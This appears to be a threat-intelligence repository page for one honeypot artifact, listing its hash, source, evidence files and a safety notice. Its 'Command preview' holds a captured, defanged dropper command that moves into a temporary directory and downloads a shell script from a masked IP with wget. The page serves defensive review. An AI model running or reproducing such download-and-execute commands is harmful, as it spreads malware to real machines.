# 7ffb5289d2eaef8369340c0628cfba7f1026250c4fb585ef71d304c610077acb

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `7ffb5289d2eaef8369340c0628cfba7f1026250c4fb585ef71d304c610077acb` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata, detections |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
[4hroot@db12-web01:~# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91[.]92[.]42[.]XXX/phantom.sh; curl -
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
